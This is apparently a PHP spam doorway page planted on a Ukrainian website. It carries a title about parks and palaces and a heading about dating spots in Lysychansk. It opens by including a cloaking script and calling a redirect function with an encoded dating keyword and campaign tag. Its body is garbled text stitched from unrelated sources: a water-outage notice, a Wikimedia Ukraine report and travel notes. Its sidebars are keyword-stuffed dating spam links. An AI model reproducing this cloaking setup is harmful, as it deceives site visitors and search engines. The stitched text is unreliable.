<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%bd%d0%b0%d0%b9%d0%ba%d1%80%d0%b0%d1%89%d1%96+%d0%bc%d1%96%d1%81%d1%86%d1%8f+%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2+%d0%9b%d0%b8%d1%81%d0%b8%d1%87%d0%b0%d0%bd%d1%81%d1%8c%d0%ba+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>7 парків та палаців у глибинці України, які варто відвідати</title>
	<meta name="description" content="В році в Лисичанську відкрито штейгерську школу — перше в сучасній Україні гірниче позаяк умови праці та рівень життя в ті роки були не найкращими. Відповідно до моніторингу..." />
	<link rel="canonical" href="https://masage.od.ua/img/137/vibav-naykrash-mstsya.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/352/kyjeh-poslugi-svatannya-v.php">послуги сватання в Покровськ Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/398/hysa-azatska-sluzhba-znayomstv.php">азіатська служба знайомств Тернопіль Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/327/cac-znayomstva-z-hristiyaninom.php">знайомства з християнином Першотравенськ Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Найкращі місця знайомств Лисичанськ Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Лисичанск, ул. Комсомольская, 10, отдел кадровой работы городского совета. В связи с проведением планового остановочного ремонта с  до  в течении суток будет прекращена подача питьевой воды в микрорайоны завода РТИ, посёлка шахты "Матросская", содового и стекольных заводов, а также в район от ул. Гора Кирова до стадиона "Шахтёр" с последующим хлорированием водопроводных сетей повышенными дозами хлора - с  Просьба произвести необходимые запасы воды.</p>
<p>Администрация КСП "Лисичанскводоканал". Уважаемые предприниматели! Традиційно ми проводимо два великих заходи — Вікіконференція для всієї української вікіспільноти і Загальні збори для членів «Вікімедіа Україна». Цього року до них додався ще один нерегулярний захід — CEE Meeting у Львові, на проведення якого ми отримали окремий грант від Фонду Вікімедіа. Загальні збори ще не відбулися , а інші два заходи загалом стали успішними. Також ми організовуємо і підтримуємо низку дрібніших заходів — від церемоній нагородження конкурсів наприклад, нагородження переможців «Вікі любить пам'ятки» і «Вікі любить землю» до підтримки вікізустрічей та едітатонів.</p>
		
			<br><ol>
			
				<li>рідні знайомства поблизу Василівка Україна.</li>
			
				<li>Навігаційне меню!</li>
			
				<li>Підписка на Велику Ідею!</li>
			
			</ol>
		
	<p>У році перший спосіб був ключовим, у списку нижче можна ознайомитися із переліком проведених тренінгів у цьому році. Протягом року члени організації отримали стипендії на відвідання 10 вікізаходів ; 8 із них — завдяки коштам із бюджету «Вікімедіа Україна».</p>
		
	<p>З 29 березня по 2 квітня відбулася конференції Вікімедіа в Берліні Німеччина. Організація делегувала на неї 3 членів Нестеренко Оля , AnnaKhrobolova WMUA , JTs , а також Antanana , як представниця від фонду Вікімедіа.</p><a id='v1'></a><h3>Навігація записів</h3><p>ViraMotorko WMUA була прийнята до команди організаторів конференції за програмою Visiting Wikimedian. Зі спільною презентацією про врядування у малих афіліатах виступили Antanana, Нестеренко Оля та JTs. Цьогорічна Вікіманія липня, Кейптаун була найкраще представлена українцями за всю історію цієї конференції. сторінку відбору. Завдяки стипендіям Фонду Вікімедіа та іншим джерелам фінансування у Вікіманії взяли участь ще 7 членів Організації і, крім них, ще 2 людини з України.</p><strong><a id='v2'></a><h2>Лисичанськ</h2></strong><p>Презентації членів ВМУА на Вікіманії — 1 про гранти для чаптерів Фонду Вікімедіа NickK ; 2 про гендерну рівність в Українській Вікіпедії Aced, бліц-промова. Ідеї з Вікіманії можна знайти на сторінці Вікіманія у формі детальних конспектів виступів , у презентації Aced на Вікіконференції вибірка кількох ідей і у блог-пості на сайті блогу «Вікімедіа Україна».</p>
<p>Оскільки цьогорічний CEE Meeting проходив в Україні, «Вікімедіа Україна» забезпечувала проїзд як учасників конференції 5 членів «Вікімедіа Україна» і 4 представники української вікіспільноти , так і волонтерів-організаторів. Детальнішу інформацію про сам захід можна знайти у відповідному розділі цього звіту див.</p><strong><a id='v3'></a><h2>Бої за Лисичанськ</h2></strong><p>У році було створено комітет мікрогрантів, щоб можна було ефективніше і швидше організовувати роботу цього проекту. Утім, проект не був особливо активним протягом року; основними напрямками діяльності стали підтримка відвідання заходів у першу чергу заради фоторепортажів і закупка книжок для вікіпедистів. Деякі традиційні заходи не вдалося підтримати через брак ресурсів або незалежні обставини — для Одеського міжнародного кінофестивалю не знайшлося фотографів-волонтерів, а на концерт Thirty Seconds To Mars у Києві не вдалося пройти фотоакредитацію.</p>
<p>Наступного року ми плануємо значно розвинути мікрогранти: цей проект буде включати в себе кілька дрібніших проектів, як-то Вікізгущівка, Вікіекспедиція і підтримка тематичних тижнів та місячників див. Два головних види підтримки — інформаційна поширення інформації в блозі і соцмережах і матеріальна надання сувенірів для найактивніших учасників.</p>
		
			
				<div>Коперник-центр, бібліотека як простір творчості. Як живе Красноріченська школа на Луганщині</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/Z0KVZQdWeQA' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>Завдяки підтриманим тематичним тижням в Українській Вікіпедії було створено статей звісно ж, роль «Вікімедіа Україна» тут лише часткова. Наступного року ми плануємо включити підтримку тематичних тижнів та місячників до мікрогрантів див. Видимість у медіа у році відбувалася за стандартними практиками: ми поширювали прес-релізи і працювали із інформаційними партнерами щодо важливих інформаційних приводів, як-то День народження Вікіпедії, конкурси статей чи фотоконкурси.</p>
<p>Окрім десятків текстових анонсів та репортажів у ЗМІ та від установ, що приймали Вікімарафон, щонайменше 10 відеосюжетів вийшло про Вікімарафон за участі вікіпедистів. Інфографіка з фактами та цифрами про Вікіпедію широко поширилась в онлайн ЗМІ і навіть була використана тележурналістами.</p><strong><a id='v4'></a><h2>Загальні збори №12/Звіт Організації — Вікімедіа Україна</h2></strong><p>Цільове звернення до органів державної влади дала відповідні результати з анонсування конкурсів «Вікі любить пам'ятки» та «Підтримай Вікімандри українською»: 22 обласні, 73 районні державні адміністрації, 17 міських рад розмістили анонс про проведення конкурсу у Вікімандрах моніторинг публікацій ; 11 обласні, 21 районні державні адміністрації, 14 органів міського рівня розмістили анонс про проведення конкурсу «Вікі любить пам'ятки» моніторинг публікацій.</p>
<p>На запит телеканалу сприяли створенню сюжету, що включав візит до дому вікіпедиста — перший випадок в історії спільноти. Також вперше в сюжеті було показано офіс організації. Продовжувала зростати кількість підписників сторінок організації та проектів у соцмережах. Чи не вперше світлини із конкурсу «Вікі любить пам'ятки» були опубліковані із вказанням автора та ліцензії: Українська правда.</p>
<p>Життя: 10 найкращих світлин пам'яток культури України року. У році ми продовжували займатися адвокацією свободи панорами.</p><img src="https://i.ytimg.com/vi/wprjmWkjnnY/maxresdefault.jpg" alt="Історія міста" style="max-width: 480px; max-height: 480px;"/><p>Очевидно, що кінцевої мети — прийняття закону про свободу панорами як для некомерційного, так і для комерційного використання — поки не досягнуто. Однак Організація просунулася у цьому напрямку і запланувала багато роботи на рік. Що важливо, ми знайшли менеджера із адвокації ВМУА, що затверджено грантовою заявкою на рік; створили чернетку адвокаційного плану; почали нову медіакампанію у блозі із просування свободи панорами детальніший список див.</p>
<p>У Мигії працює велика кількість кемпів, є аренда човнів, можливість самостійно готувати їжу чи замовляти повноцінне харчування. Інфраструктура будується, головне — дістатися місця. З цим на жаль, поки що проблеми у тих, чий автошлях проходить Миколаївською областю. З боку Києва та Вінниці все непогано, а іншим краще скористатися залізницею чи подорожувати позашляховиком. Ми вже розповідали про 10 причин відвідати Маріуполь , вони все ще актуальні, тільки за останні роки місце ще більше покращило умови для життя місцевих та прийому гостей.</p>
<p>Маріуполь, місто промислове, портове, торгове, козацьке, грецьке, морське, степове, крамарське, військове, старовинне і сучасне водночас. Екологія залишається найгострішею проблемою, а близькість фронту зупиняє багатьох, але, на щастя, не усіх. Чи їхати відпочивати на море поруч з Маріуполем — питання філософське. Хоча на нашу думку, Білосарайська коса — місце набагато спокійніше та більш придатне для релаксу, ніж Кирилівка чи Затока.</p>
<p>Але що стосується самого міста, то їхати сюди варто на кілька днів , щоб встигнути продегустувати грецьку та інші кухні, місцеві сири та вина. Прогулятися вуличками старого міста, піднятися на Вежу та знайти усі маленькі скульптурки з архітектором Нільсеном. Порахувати маяки. Обійти десятки локацій з монументальними мозаїками. Відвідати культурні простори, виставку в хоча в одному з музеїв. А якщо час візиту співпадає, наприклад, з Гоголь-Фестом, ооо, ми вам вже заздримо! Дорога поїздом з Києва та інших міст центральної та західної України доволі довга, а от з Харкова, Дніпра, Запоріжжя краще їхати авто: нові дороги чудові і поруч з ними є що подивитися.</p>
<p>Ви все ще вважаєте, що у Вінниці з туристичних атракцій є лише вежа, музей Пірогова та фонтан Рошен?! Тут купа затишних парків, різнопланових музеїв, смачних закладів з подільською кухнею та чисто туристичних атракцій на кшталт маленьких скульптурок на мості чи прогулянки по Бугу венеціанською гондолою. Рекомендуємо в жодному разі не обмежуватися лише обласним центром і кілька днів відвести на знайомство з регіоном.</p>
<p>Наш особистий топ місць навколо Вінниці: музей авіації в палаці у Вороновиці, усипальниця Потоцьких авторства Городоцького у Печері, Тульчин з палацом та фестивалем Леонтовича, іудейські старожитності у Шаргороді та таємнича й творча Буша майже на південному кордоні. З дорогами на Вінниччині останні роки стало набагато краще, ніж раніше.</p>
<p>До більшості районних міст та палаців дорога дуже гарна чи хоча б непогана.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/184/buveh-pdklyuchiti-palichki.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/196/tevah-bezkoshtovn-lesbyanki.php">безкоштовні лесбіянки знайомства в Богуслав Україна</a></li><li><a href="https://masage.od.ua/img/248/mym-eltn-shvidksn.php">елітні швидкісні побачення в Подільськ Україна</a></li><li><a href="https://masage.od.ua/img/103/dono-tse-nove.php">це нове чорне побачення Сновськ Україна</a></li><li><a href="https://masage.od.ua/img/335/todi-eltniy-dodatok-dlya.php">елітний додаток для знайомств в Генічеськ Україна</a></li><li><a href="https://masage.od.ua/img/468/colu-shvidk-znayomstva.php">швидкі знайомства Олександрія Україна</a></li><li><a href="https://masage.od.ua/img/457/bubom-sayt-znayomstv-z.php">сайт знайомств з герпесом Лохвиця Україна</a></li><li><a href="https://masage.od.ua/img/240/ren-mzhrasov-sayti.php">міжрасові сайти знайомств поблизу Сорокине Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Articles</h2>
				<ol><li><a href='#v1'>Навігація записів</a></li>
<li><a href='#v2'>Лисичанськ</a></li>
<li><a href='#v3'>Бої за Лисичанськ</a></li>
<li><a href='#v4'>Загальні збори №12/Звіт Організації — Вікімедіа Україна</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/137/qagu-znayomstva-metro.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>